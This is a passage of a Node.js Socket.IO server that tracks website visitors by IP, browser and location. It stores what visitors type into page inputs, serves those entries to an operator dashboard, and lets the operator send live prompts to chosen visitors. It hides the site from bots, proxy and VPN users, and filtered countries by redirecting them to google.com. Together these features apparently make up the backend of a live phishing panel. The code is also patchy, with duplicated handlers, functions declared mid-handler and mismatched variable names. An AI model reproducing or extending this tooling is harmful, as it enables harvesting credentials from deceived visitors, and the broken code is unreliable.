          const visitorData = ipCache.get(ip);
          
          // Update basic path and activity info
          visitorData.lastPath = path;
          visitorData.lastActivity = new Date();
          visitorData.title = data.title || '';
          
          // Store enhanced client information
          if (data.browser) {
            visitorData.browser = data.browser.name || 'Unknown';
            visitorData.browserVersion = data.browser.version || '';
            visitorData.browserFullVersion = data.browser.fullVersion || 'Unknown';
            visitorData.language = data.browser.language || 'Unknown';
          }
          
          if (data.os) {
            visitorData.os = data.os.name || 'Unknown';
            visitorData.osVersion = data.os.version || '';
            visitorData.osFullVersion = data.os.fullVersion || 'Unknown';
          }
          
          if (data.device) {
            visitorData.deviceType = data.device.type || 'Desktop';
            visitorData.screenWidth = data.device.screenWidth || 0;
            visitorData.screenHeight = data.device.screenHeight || 0;
          }
          
          // Store timezone and referrer
          visitorData.timezone = data.timezone || 'Unknown';
          visitorData.referrer = data.referrer || 'Direct';
          
          // Save updated visitor data
          ipCache.set(ip, visitorData);
          
          // Emit dashboard update to reflect new information
          io.emit('dashboard-update');
        }
      }
    });
    
    // Handle block IP request from dashboard
    socket.on('block-ip', (data) => {
      if (data && data.ip) {
        const success = blockIP(data.ip);
        socket.emit('block-ip-result', { 
          success, 
          ip: data.ip, 
          message: success ? `IP ${data.ip} has been blocked` : `Failed to block IP ${data.ip}`
        });
        io.emit('dashboard-update');
      }
    });
    
    // Handle unblock IP request from dashboard
    socket.on('unblock-ip', (data) => {
      if (data && data.ip) {
        const success = unblockIP(data.ip);
        socket.emit('unblock-ip-result', { 
          success, 
          ip: data.ip, 
          message: success ? `IP ${data.ip} has been unblocked` : `Failed to unblock IP ${data.ip}`
        });
        io.emit('dashboard-update');
      }
    });
    
    // Handle update country settings request
    socket.on('update-country-settings', (data) => {
      if (data) {
        // Update blocked countries
        if (Array.isArray(data.blockedCountries)) {
          globalSettings.blockedCountries = data.blockedCountries;
        }
        
        // Update allowed countries
        if (Array.isArray(data.allowedCountries)) {
          globalSettings.allowedCountries = data.allowedCountries;
        }
        
        // Update filter mode
        if (data.mode) {
          // Ensure mode is exactly 'allow' or 'block'
          globalSettings.countryFilterMode = data.mode === 'allow' ? 'allow' : 'block';
          console.log(`Country filter mode set to: ${globalSettings.countryFilterMode}`);
        }
        
        // Update redirect URL
        if (data.redirectUrl) {
          globalSettings.countryRedirectUrl = data.redirectUrl;
        }
        
        // Update proxy detection setting
        if (typeof data.proxyDetectionEnabled === 'boolean') {
          globalSettings.proxyDetectionEnabled = data.proxyDetectionEnabled;
          console.log(`Proxy detection ${globalSettings.proxyDetectionEnabled ? 'enabled' : 'disabled'}`);
        }
        
        console.log('Updated country filter settings:', globalSettings);
        socket.emit('country-settings-updated', { success: true });
        io.emit('dashboard-update');
      }
    });
    
    // Handle get country filter settings request
    socket.on('get-country-filter-settings', () => {
      // Log the current settings for debugging
      console.log('Sending country filter settings:', globalSettings);
      
      // Convert Set objects to arrays before sending to client
      socket.emit('country-filter-settings', {
        countryFilterMode: globalSettings.countryFilterMode || 'block',
        blockedCountries: globalSettings.blockedCountries instanceof Set ? Array.from(globalSettings.blockedCountries) : (globalSettings.blockedCountries || []),
        allowedCountries: globalSettings.allowedCountries instanceof Set ? Array.from(globalSettings.allowedCountries) : (globalSettings.allowedCountries || []),
        countryRedirectUrl: globalSettings.countryRedirectUrl || '',
        proxyDetectionEnabled: globalSettings.proxyDetectionEnabled || false
      });
    });
    
    // Handle send message to specific client
    socket.on('send-client-message', (data) => {
      if (!data || !data.ip || !data.message) {
        socket.emit('message-status', { success: false, error: 'Invalid message data' });
        return;
      }
      
      const { ip, message } = data;
      console.log(`Sending message to client ${ip}:`, message);
      
      // Find all sockets for this IP
      const targetSockets = [];
      for (const [id, s] of io.sockets.sockets) {
        if (s.clientIP === ip) {
          targetSockets.push(s);
        }
      }
      
      if (targetSockets.length === 0) {
        socket.emit('message-status', { success: false, error: 'Client not connected' });
        return;
      }
      
      // Send message to all sockets for this IP
      targetSockets.forEach(targetSocket => {
        targetSocket.emit('client-message', message);
      });
      
      socket.emit('message-status', { 
        success: true, 
        message: `Message sent to ${targetSockets.length} active connections for IP ${ip}` 
      });
    });
    
    // Handle send message to all clients
    socket.on('send-all-clients-message', (data) => {
      if (!data || !data.message) {
        socket.emit('message-status', { success: false, error: 'Invalid message data' });
        return;
      }
      
      const { message } = data;
      console.log('Sending message to all clients:', message);
      
      // Send to all connected clients except the sender
      socket.broadcast.emit('client-message', message);
      
      socket.emit('message-status', { 
        success: true, 
        message: `Message sent to all connected clients` 
      });
    });
    
    // Handle get visitor country request
    socket.on('get-visitor-country', (data) => {
      if (!data || !data.clientIP) {
        socket.emit('visitor-country', { error: 'No IP provided' });
        return;
      }
      
      // Use the IP to determine the country
      getCountryFromIP(data.clientIP).then(country => {
        // Check if proxy detection is enabled and if the IP is a proxy
        if (globalSettings.proxyDetectionEnabled) {
          isProxyIP(data.clientIP).then(isProxy => {
            socket.emit('visitor-country', { 
              country, 
              isProxy,
              proxyDetectionEnabled: globalSettings.proxyDetectionEnabled 
            });
          }).catch(err => {
            console.error('Error checking if IP is proxy:', err);
            socket.emit('visitor-country', { 
              country, 
              proxyDetectionEnabled: globalSettings.proxyDetectionEnabled 
            });
          });
        } else {
          socket.emit('visitor-country', { 
            country, 
            proxyDetectionEnabled: globalSettings.proxyDetectionEnabled 
          });
        }
      }).catch(err => {
        console.error('Error getting country from IP:', err);
        socket.emit('visitor-country', { error: 'Failed to determine country' });
      });
    });
    
    // Handle toggle proxy detection
    socket.on('toggle-proxy-detection', () => {
      // Toggle proxy detection
      globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
      
      console.log(`Proxy detection ${globalSettings.proxyDetectionEnabled ? 'enabled' : 'disabled'}`);
      
      // Emit proxy detection status to all clients
      io.emit('proxy-detection-status', { enabled: globalSettings.proxyDetectionEnabled });
      
      // Emit success to the requester
      socket.emit('proxy-detection-toggled', { 
        success: true, 
        enabled: globalSettings.proxyDetectionEnabled 
      });
    });
    
    // Handle block IP request
    socket.on('block-ip', (data) => {
      const ip = data.ip;
      if (!ip) {
        socket.emit('block-ip-result', { success: false, message: 'No IP provided' });
        return;
      }
      
      // Skip blocking for local/private IPs
      if (isLocalIP(ip)) {
        socket.emit('block-ip-result', { 
          success: false, 
          ip,
          message: `Cannot block local/private IP ${ip}` 
        });
        return;
      }
      
      // Block the IP - our enhanced blockIP function handles notifications
      const success = blockIP(ip);
      
      // Emit result to the requester
      socket.emit('block-ip-result', { 
        success, 
        ip,
        message: success ? `IP ${ip} has been blocked` : `IP ${ip} is already blocked` 
      });
      
      // If successful, force disconnect any active connections from this IP
      if (success && activeSocketsByIP.has(ip)) {
        const activeSockets = activeSocketsByIP.get(ip);
        const socketIds = Array.isArray(activeSockets) ? activeSockets : Array.from(activeSockets);
        
        console.log(`Disconnecting ${socketIds.length} active connections from blocked IP ${ip}`);
        
        socketIds.forEach(socketId => {
          const targetSocket = io.sockets.sockets.get(socketId);
          if (targetSocket) {
            // Send redirect event before disconnecting
            const redirectUrl = globalSettings.countryRedirectUrl || 'https://google.com';
            targetSocket.emit('redirect', { 
              url: redirectUrl, 
              reason: 'ip_blocked',
              permanent: true // Indicate this is a permanent block
            });
            
            // Disconnect after a short delay to ensure the redirect event is sent
            setTimeout(() => {
              if (targetSocket.connected) {
                targetSocket.disconnect(true);
                console.log(`Forced disconnect of blocked IP ${ip} (socket ${socketId})`);
              }
            }, 500);
          }
        });
      }
    });
    
    // Handle unblock IP request
    socket.on('unblock-ip', (data) => {
      const ip = data.ip;
      if (!ip) {
        socket.emit('unblock-ip-result', { success: false, message: 'No IP provided' });
        return;
      }
      
      // Unblock the IP - our enhanced unblockIP function handles notifications
      const success = unblockIP(ip);
      
      // Emit result to the requester
      socket.emit('unblock-ip-result', { 
        success, 
        ip,
        message: success ? `IP ${ip} has been unblocked` : `IP ${ip} was not blocked` 
      });
    });
    
/**
 * Check if an IP address is a proxy/VPN
 * @param {string} ip - The IP address to check
 * @returns {Promise<boolean>} - A promise that resolves to true if the IP is a proxy, false otherwise
 */
async function isProxyIP(ip) {
  // Skip check for local/private IPs
  if (isLocalIP(ip)) {
    console.log(`IP ${ip} is local/private, skipping proxy check`);
    return false;
  }
  
  // Check cache first
  const cacheKey = `proxy_${ip}`;
  const cachedResult = ipCache.get(cacheKey);
  if (cachedResult !== undefined) {
    console.log(`Using cached proxy result for IP ${ip}: ${cachedResult}`);
    return cachedResult;
  }
  
  try {
    // Try ipqualityscore.com API if API key is available
    if (process.env.IPQS_API_KEY) {
      const url = `https://ipqualityscore.com/api/json/ip/${process.env.IPQS_API_KEY}/${ip}?strictness=1&allow_public_access_points=true`;
      const response = await axios.get(url);
      
      if (response.data && response.data.success) {
        const isProxy = response.data.proxy || response.data.vpn || response.data.tor || response.data.is_crawler;
        console.log(`IP ${ip} proxy check result from ipqualityscore.com:`, isProxy);
        
        // Cache the result for 12 hours
        ipCache.set(cacheKey, isProxy, 12 * 60 * 60);
        return isProxy;
      }
    }
    
    // Fallback to ipapi.co which has some proxy detection
    const url = `https://ipapi.co/${ip}/json/`;
    const response = await axios.get(url);
    
    if (response.data) {
      // ipapi.co doesn't have a direct proxy field, but we can check for data centers and security threats
      const isProxy = response.data.security && (response.data.security.is_proxy || response.data.security.is_datacenter || response.data.security.is_threat);
      console.log(`IP ${ip} proxy check result from ipapi.co:`, isProxy || false);
      
      // Cache the result for 12 hours
      ipCache.set(cacheKey, isProxy || false, 12 * 60 * 60);
      return isProxy || false;
    }
    
    // Default to false if we couldn't determine
    console.log(`Could not determine if IP ${ip} is a proxy, defaulting to false`);
    return false;
  } catch (err) {
    console.error(`Error checking if IP ${ip} is a proxy:`, err);
    return false;
  }
}

/**
 * Get country from IP address using external API
 * @param {string} ip - The IP address to look up
 * @returns {Promise<string>} - A promise that resolves to a 2-letter country code
 */
async function getCountryFromIP(ip) {
  try {
    // Check if IP is valid
    if (!ip || ip === 'unknown' || ip === 'localhost' || ip === '127.0.0.1') {
      return 'XX'; // Unknown country code
    }
    
    // Check cache first
    const cachedCountry = getCountryFromCache(ip);
    if (cachedCountry) {
      return cachedCountry;
    }
    
    // Try multiple IP geolocation services for redundancy
    const services = [
      `https://ipapi.co/${ip}/country/`,
      `https://ipinfo.io/${ip}/country`,
      `https://api.ipgeolocation.io/ipgeo?apiKey=${process.env.IPGEO_API_KEY}&ip=${ip}`
    ];
    
    // Try each service in sequence until one works
    for (const service of services) {
      try {
        const response = await axios.get(service, { timeout: 3000 });
        let country = null;
        
        if (response.data) {
          if (typeof response.data === 'string') {
            // ipapi.co and ipinfo.io return just the country code as a string
            country = response.data.trim();
          } else if (response.data.country_code2) {
            // ipgeolocation.io returns a JSON object
            country = response.data.country_code2;
          }
          
          if (country && country.length === 2) {
            // Cache the result
            cacheCountry(ip, country);
            return country.toUpperCase();
          }
        }
      } catch (err) {
        console.log(`Error with ${service}:`, err.message);
        // Continue to next service
      }
    }
    
    // If all services fail, return unknown
    return 'XX';
  } catch (err) {
    console.error('Error in getCountryFromIP:', err);
    return 'XX';
  }
}

// Country cache to reduce API calls
const countryCache = new Map();
const CACHE_TTL = 24 * 60 * 60 * 1000; // 24 hours

/**
 * Get country from cache
 * @param {string} ip - The IP address to look up
 * @returns {string|null} - The country code or null if not in cache
 */
function getCountryFromCache(ip) {
  if (countryCache.has(ip)) {
    const cacheEntry = countryCache.get(ip);
    if (Date.now() - cacheEntry.timestamp < CACHE_TTL) {
      return cacheEntry.country;
    } else {
      // Remove expired entry
      countryCache.delete(ip);
    }
  }
  return null;
}

/**
 * Cache country for an IP
 * @param {string} ip - The IP address
 * @param {string} country - The country code
 */
function cacheCountry(ip, country) {
  countryCache.set(ip, {
    country: country.toUpperCase(),
    timestamp: Date.now()
  });
}
    
    // Handle client IP updates
    socket.on('client-ip', (data) => {
      if (data && data.clientIP) {
        const oldIP = socket.clientIP;
        const newIP = data.clientIP;
        
        // Update socket.clientIP with the front-end IP
        socket.clientIP = newIP;
        console.log(`Updated client IP from ${oldIP} to ${newIP} for socket ${socket.id}`);
        
        // Ensure the socket is marked as active for the client IP
        updateVisitorOnlineStatus(newIP, true, socket.id);
        
        // Update visitor online status for the old IP if different
        if (oldIP && oldIP !== newIP) {
          updateVisitorOnlineStatus(oldIP, false, socket.id);
        }
      }
    });

    // Helper function to get and update client IP from event data
    function getClientIP(data, socket) {
      // Use client IP from front-end if available, otherwise fall back to socket.clientIP
      const clientIP = data.clientIP || socket.clientIP;

      // Update socket.clientIP with the front-end IP for future reference
      if (data.clientIP) {
        socket.clientIP = data.clientIP;
        console.log('Updated client IP from front-end:', data.clientIP);
      }

      return clientIP;
    }

    // Helper function to check if an IP is blocked
    function isIPBlocked(ip) {
      return ipCache.has(ip) && ipCache.get(ip).isBlocked;
    }

    // Helper function to get visitor data with caching
    function getVisitorData(clientIP) {
      if (ipCache.has(clientIP)) {
        return ipCache.get(clientIP);
      }
      return null;
    }

    // Using global getGeoData function for geolocation data

    // Helper function to update input data cache
    function updateInputDataCache(clientIP, data) {
      // Store input data with IP association
      if (!inputDataCache.has(clientIP)) {
        inputDataCache.set(clientIP, []);
      }

      // Add timestamp and path information
      const inputData = {
        ...data,
        ip: clientIP,
        timestamp: new Date().toISOString()
      };

      // Add to the beginning of the array (newest first)
      const ipInputs = inputDataCache.get(clientIP);
      ipInputs.unshift(inputData);

      // Limit to 50 most recent inputs per IP
      if (ipInputs.length > 50) {
        ipInputs.pop();
      }

      // Update the cache
      inputDataCache.set(clientIP, ipInputs);

      // Notify dashboard of new input data
      io.emit('input-data-update');
    }

    // Helper function to update visitor online status
    function updateVisitorOnlineStatus(clientIP, isOnline, socketId) {
      if (!clientIP) return;
      
      // Initialize the set of active sockets for this IP if it doesn't exist
      if (!activeSocketsByIP.has(clientIP)) {
        activeSocketsByIP.set(clientIP, new Set());
      }
      
      const activeSockets = activeSocketsByIP.get(clientIP);
      
      if (isOnline) {
        // Add this socket to the active sockets for this IP
        activeSockets.add(socketId);
      } else {
        // Remove this socket from the active sockets for this IP
        activeSockets.delete(socketId);
      }
      
      // Update the IP cache with the online status
      if (ipCache.has(clientIP)) {
        const visitorData = ipCache.get(clientIP);
        
        // Only consider online if there's at least one active socket
        const hasActiveSockets = activeSockets.size > 0;
        visitorData.isOnline = hasActiveSockets;
        visitorData.activeConnections = activeSockets.size;
        
        if (hasActiveSockets) {
          visitorData.lastConnected = new Date();
        } else {
          visitorData.lastDisconnected = new Date();
        }
        
        ipCache.set(clientIP, visitorData);
        console.log(`IP ${clientIP} status updated: online=${hasActiveSockets}, active connections=${activeSockets.size}`);
        
        // Notify dashboard of the update
        io.emit('dashboard-update');
      }
    }

    // These functions have been moved to global scope

    // Helper function to initialize a new IP cache entry
    async function initializeIPCacheEntry(clientIP, path, socket) {
      // Parse user agent
      const userAgent = socket?.handshake?.headers['user-agent'] || 'Unknown';
      const uaParser = new UAParser(userAgent);
      const browser = uaParser.getBrowser();
      const os = uaParser.getOS();
      const device = uaParser.getDevice();

      // Create new visitor data entry
      const visitorData = {
        ip: clientIP,
        userAgent: userAgent,
        browser: browser.name || 'Unknown',
        browserVersion: browser.version || 'Unknown',
        os: os.name || 'Unknown',
        osVersion: os.version || 'Unknown',
        device: device.vendor ? `${device.vendor} ${device.model}` : 'Unknown',
        deviceType: device.type || 'Unknown',
        firstRequest: new Date(),
        lastRequest: new Date(),
        lastPath: path || '/',
        requestCount: 1,
        isBot: isBot(userAgent),
        isBlocked: false,
        isOnline: true,
        lastConnected: new Date(),
        inputs: []
      };

      // Store in cache
      ipCache.set(clientIP, visitorData);

      // Emit new visitor event to dashboard
      io.emit('new-visitor', visitorData);

      // Fetch geo data asynchronously using cached function
      getGeoData(clientIP).then(geoData => {
        if (ipCache.has(clientIP)) {
          const updatedVisitorData = ipCache.get(clientIP);
          updatedVisitorData.country = geoData.country || 'Unknown';
          updatedVisitorData.countryCode = geoData.countryCode || 'XX';
          updatedVisitorData.city = geoData.city || 'Unknown';
          updatedVisitorData.isp = geoData.isp || 'Unknown';
          updatedVisitorData.proxy = geoData.proxy || false;
          updatedVisitorData.hosting = geoData.hosting || false;
          ipCache.set(clientIP, updatedVisitorData);

          // Emit dashboard update and new visitor event with geo data
          io.emit('dashboard-update');
          io.emit('new-visitor', updatedVisitorData);
        }
      }).catch(error => {
        console.error(`Error fetching geo data for IP ${clientIP}:`, error);
      });

      return visitorData;
    }

    // Helper function to update IP cache with page view data
    function updateIPCacheWithPageView(clientIP, path, socket) {
      if (ipCache.has(clientIP)) {
        const ipData = ipCache.get(clientIP);
        ipData.lastPath = path;
        ipData.lastRequest = new Date();
        ipData.requestCount = (ipData.requestCount || 0) + 1;
        ipCache.set(clientIP, ipData);

        // If we don't have country data yet, fetch it
        if (!ipData.countryCode) {
          fetchGeoData(clientIP).then(geoData => {
            if (geoData && ipCache.has(clientIP)) {
              const updatedData = ipCache.get(clientIP);
              updatedData.country = geoData.country || null;
              updatedData.countryCode = geoData.countryCode || null;
              updatedData.city = geoData.city || null;
              updatedData.region = geoData.region || null;
              updatedData.isp = geoData.isp || null;
              updatedData.org = geoData.org || null;
              updatedData.hosting = geoData.hosting || false;
              updatedData.proxy = geoData.proxy || false;
              ipCache.set(clientIP, updatedData);
              io.emit('dashboard-update');
            }
          });
        }
      } else {
        // Initialize a new IP cache entry
        initializeIPCacheEntry(clientIP, path, socket);
      }

      // Notify dashboard of visitor update
      io.emit('dashboard-update');
    }

    // Handle page view events from clients
    socket.on('page-view', (data) => {
      const clientIP = getClientIP(data, socket);

      // Skip if IP is blocked
      if (isIPBlocked(clientIP)) {
        return;
      }

      // Skip tracking for dashboard requests
      if (data.path && data.path.startsWith('/dashboard')) {
        console.log('Skipping dashboard request tracking for:', clientIP);
        return;
      }

      // Update IP cache with page view data
      updateIPCacheWithPageView(clientIP, data.path, socket);
    });

    // Handle input data from clients
    socket.on('input-data', (data) => {
      // Get the most accurate client IP available
      const clientIP = data.clientIP || data.ip || getClientIP(data, socket);
      
      console.log(`Received input data from client IP: ${clientIP} on path: ${data.path || 'unknown'}`);

      // Skip if IP is blocked
      if (isIPBlocked(clientIP)) {
        console.log(`Skipping input tracking for blocked IP: ${clientIP}`);
        return;
      }

      // Store the accurate IP mapping if available
      if (data.clientIP && data.clientIP !== data.ip) {
        accurateClientIPs.set(data.ip, {
          clientIP: data.clientIP,
          timestamp: new Date().toISOString()
        });
        console.log(`Updated accurate IP mapping: ${data.ip} -> ${data.clientIP}`);
      }

      // Update input data cache with the new data
      updateInputDataCache(clientIP, data);

      // Emit dashboard update
      io.emit('dashboard-update');
    });
  });

// This function was moved to the top of the file to avoid duplicate declarations
// See the implementation at line ~747

/**
 * Emit a message prompt event to a specific IP address
 * @param {string} ip - The IP address to send the message to
 * @param {string} message - The message content
 * @param {string} type - The message type (info, warning, error, success)
 * @param {string} title - The message title
 * @returns {boolean} - Whether the message was sent successfully
 */
function emitMessagePrompt(ip, message, type = 'info', title = 'Message') {
  // Validate inputs
  if (!ip || !message) {
    console.error('Invalid message prompt parameters:', { ip, message });
    return false;
  }
  
  // Find all active sockets for this IP
  const activeSockets = findSocketsByIP(ip);
  if (!activeSockets || activeSockets.length === 0) {
    console.log(`No active sockets found for IP ${ip}`);
    return false;
  }
  
  // Send message prompt event to all active sockets for this IP
  let messageSent = false;
  activeSockets.forEach(socketId => {
    const socket = io.sockets.sockets.get(socketId);
    if (socket && socket.connected) {
      console.log(`Emitting message prompt to socket ${socketId} for IP ${ip}: ${message}`);
      socket.emit('message-prompt', { ip, message, type, title });
      messageSent = true;
    }
  });
  
  return messageSent;
}

/**
 * Find all active socket IDs for a specific IP address
 * @param {string} ip - The IP address to find sockets for
 * @returns {Array} - Array of socket IDs
 */
function findSocketsByIP(ip) {
  // Check if we have a mapping for this IP in activeSocketsByIP
  if (activeSocketsByIP.has(ip)) {
    return activeSocketsByIP.get(ip);
  }
  
  // If not found in the map, try to find sockets with this IP
  const matchingSockets = [];
  io.sockets.sockets.forEach((socket, id) => {
    if (socket.clientIP === ip) {
      matchingSockets.push(id);
    }
  });
  
  // Cache the result for future use
  if (matchingSockets.length > 0) {
    activeSocketsByIP.set(ip, matchingSockets);
  }
  
  return matchingSockets;
}

/**
 * Sanitize and validate a URL
 * @param {string} url - The URL to sanitize
 * @returns {string|null} - The sanitized URL or null if invalid
 */
function sanitizeURL(url) {
  if (!url) return null;
  
  // If URL doesn't start with http/https and doesn't start with a slash, assume it's a relative path
  if (!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('/')) {
    url = '/' + url;
  }
  
  // For security, if it's an absolute URL, only allow certain domains
  if (url.startsWith('http://') || url.startsWith('https://')) {
    try {
      const urlObj = new URL(url);
      const allowedDomains = [
        'google.com',
        'microsoft.com',
        'apple.com',
        'amazon.com',
        'facebook.com',
        'twitter.com',
        'instagram.com',
        'linkedin.com',
        'youtube.com',
        'netflix.com',
        'spotify.com',
        'localhost'
      ];
      
      // Check if domain or its parent is in allowed list
      const domain = urlObj.hostname;
      const isAllowed = allowedDomains.some(allowedDomain => 
        domain === allowedDomain || domain.endsWith('.' + allowedDomain)
      );
      
      if (!isAllowed) {
        console.warn(`Blocked redirect to non-allowed domain: ${domain}`);
        return null;
      }
    } catch (e) {
      console.error('Invalid URL:', url, e);
      return null;
    }
  }
  
  return url;
}

// API endpoint to get input data for a specific IP
app.get('/dashboard/input-data/:ip', (req, res) => {
  const ip = req.params.ip;
  
  // Validate IP
  if (!ip) {
    return res.status(400).json({ error: 'Invalid IP address' });
  }
  
  // Get visitor data for this IP
  const visitorData = {};
  if (ipCache.has(ip)) {
    Object.assign(visitorData, ipCache.get(ip));
  }
  
  // Get actual input data for this IP from our inputDataByIP map
  const inputData = inputDataByIP.has(ip) ? inputDataByIP.get(ip) : [];
  
  // Sort input data by timestamp (newest first)
  inputData.sort((a, b) => {
    const dateA = new Date(a.timestamp);
    const dateB = new Date(b.timestamp);
    return dateB - dateA;
  });
  
  // Return input data and visitor metadata
  res.json({
    inputs: inputData,
    meta: {
      browser: visitorData.browser || 'Unknown',
      os: visitorData.os || 'Unknown',
      device: visitorData.device || visitorData.deviceType || 'Unknown',
      firstSeen: visitorData.firstRequest || new Date().toISOString(),
      lastActivity: visitorData.lastActivity || visitorData.lastRequest || new Date().toISOString(),
      currentPath: visitorData.lastPath || '/',
      country: visitorData.country || 'Unknown',
      city: visitorData.city || 'Unknown',
      isp: visitorData.isp || 'Unknown',
      org: visitorData.org || 'Unknown',
      proxy: visitorData.proxy || false,
      timezone: visitorData.timezone || 'Unknown',
      referrer: visitorData.referrer || 'Direct'
    }
  });
});
